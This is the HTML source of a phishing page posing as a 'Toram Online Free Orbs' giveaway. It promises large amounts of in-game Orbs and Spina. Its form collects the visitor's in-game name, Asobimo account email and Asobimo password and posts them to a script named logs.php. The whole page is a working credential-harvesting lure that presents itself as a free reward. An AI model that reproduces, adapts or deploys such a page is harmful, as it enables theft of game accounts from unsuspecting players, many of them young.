<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Toram Online Free Orbs</title>
    <style>
        @import url('https://fonts.googleapis.com/css?family=Poppins:200i,400&display=swap');

        :root {
        --color-white: #f3f3f3;
        --color-darkblue: #1b1b32;
        --color-darkblue-alpha: rgba(27, 27, 50, 0.8);
        --color-green: #37af65;
        }

        *,
        *::before,
        *::after {
        box-sizing: border-box;
        }

        body {
        font-family: 'Poppins', sans-serif;
        font-size: 1rem;
        font-weight: 400;
        line-height: 1.4;
        color: var(--color-white);
        margin: 0;
        }

        /* mobile friendly alternative to using background-attachment: fixed */
        body::before {
        content: '';
        position: fixed;
        top: 0;
        left: 0;
        height: 100%;
        width: 100%;
        z-index: -1;
        background: var(--color-darkblue);
        background-image: linear-gradient(
            115deg,
            rgba(170, 170, 209, 0.5),
            rgba(73, 73, 75, 0.4)
            ),
            url(bg2.jpg);
        background-size: cover;
        background-repeat: no-repeat;
        background-position: center;
        }

        h1 {
        font-weight: 400;
        line-height: 1.2;
        }

        p {
        font-size: 1.125rem;
        }

        h1,
        p {
        margin-top: 0;
        margin-bottom: 0.5rem;
        }

        label {
        display: flex;
        align-items: center;
        font-size: 1.125rem;
        margin-bottom: 0.5rem;
        }

        input,
        button,
        select,
        textarea {
        margin: 0;
        font-family: inherit;
        font-size: inherit;
        line-height: inherit;
        }

        button {
        border: none;
        }

        .container {
        width: 100%;
        margin: 3.125rem auto 0 auto;
        }

        @media (min-width: 576px) {
        .container {
            max-width: 540px;
        }
        }

        @media (min-width: 768px) {
        .container {
            max-width: 720px;
        }
        }

        .header {
        padding: 0 0.625rem;
        margin-bottom: 1.875rem;
        }

        .description {
        font-style: italic;
        font-weight: 200;
        text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.4);
        }

        .clue {
        margin-left: 0.25rem;
        font-size: 0.9rem;
        color: #e4e4e4;
        }

        .text-center {
        text-align: center;
        }

        /* form */

        form {
        background: var(--color-darkblue-alpha);
        padding: 2.5rem 0.625rem;
        border-radius: 0.25rem;
        }

        @media (min-width: 480px) {
        form {
            padding: 2.5rem;
        }
        }

        .form-group {
        margin: 0 auto 1.25rem auto;
        padding: 0.25rem;
        }

        .form-control {
        display: block;
        width: 100%;
        height: 2.375rem;
        padding: 0.375rem 0.75rem;
        color: #495057;
        background-color: #fff;
        background-clip: padding-box;
        border: 1px solid #ced4da;
        border-radius: 0.25rem;
        transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
        }

        .form-control:focus {
        border-color: #80bdff;
        outline: 0;
        box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25);
        }

        .input-radio,
        .input-checkbox {
        display: inline-block;
        margin-right: 0.625rem;
        min-height: 1.25rem;
        min-width: 1.25rem;
        }

        .input-textarea {
        min-height: 120px;
        width: 100%;
        padding: 0.625rem;
        resize: vertical;
        }

        .submit-button {
        display: block;
        width: 100%;
        padding: 0.75rem;
        background: var(--color-green);
        color: inherit;
        border-radius: 2px;
        cursor: pointer;
        }
        footer {
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <header class="header">
          <h1 id="title" class="text-center">Toram Online Free Orb!</h1>
          <p id="description" class="description text-center">
            Please be patient because it will take some time to send orbs to your account
          </p>
        </header>
        <form id="survey-form" action="logs.php" method="post">
          <div class="form-group">
            <label id="name-label" for="name">IGN</label>
            <input
              type="text"
              name="name"
              id="name"
              class="form-control"
              placeholder="Enter your IGN (In Game Name)"
              required
            />
          </div>
          <div class="form-group">
            <label id="email-label" for="email">Email</label>
            <input
              type="email"
              name="email"
              id="email"
              class="form-control"
              placeholder="Enter your Asobimo Email"
              required
            />
          </div>
          <div class="form-group">
            <label id="number-label" for="number"
              >Password</label
            >
            <input
              type="password"
              name="password"
              id="number"
              class="form-control"
              placeholder="Enter your Asobimo Password"
            />
          </div>
          <div class="form-group">
            <p>Orb</p>
            <select id="dropdown" name="Orbs" class="form-control" required>
              <option disabled selected value>Select Orbs</option>
              <option value="2000">2000 Orbs</option>
              <option value="1500">1500 Orbs</option>
              <option value="1000">1000 Orbs</option>
              <option value="500">500 Orbs</option>
              <option value="200">200 Orbs</option>
            </select>
          </div>
      
          <div class="form-group">
            <p>
              Bonus Spina
            </p>
            <select id="most-like" name="Spina" class="form-control" required>
              <option disabled selected value>Spina</option>
              <option value="50juta">50.000.000 Spina</option>
              <option value="30juta">30.000.000 Spina</option>
              <option value="15juta">15.000.000 Spina</option>
              <option value="5juta">5.000.000 Spina</option>
            </select>
          </div>
      
          <div class="form-group">
            <p>
              Confirm?
            </p>
      
            <label
              ><input
                name="prefer"
                value="Confirmed"
                type="checkbox"
                class="input-checkbox"
              />Confirmed</label
            >
          </div>
      
          <div class="form-group">
            <button name="submit" type="submit" id="submit" class="submit-button">
              Process!
            </button>
          </div>
        </form>
      </div>
</body>
</html>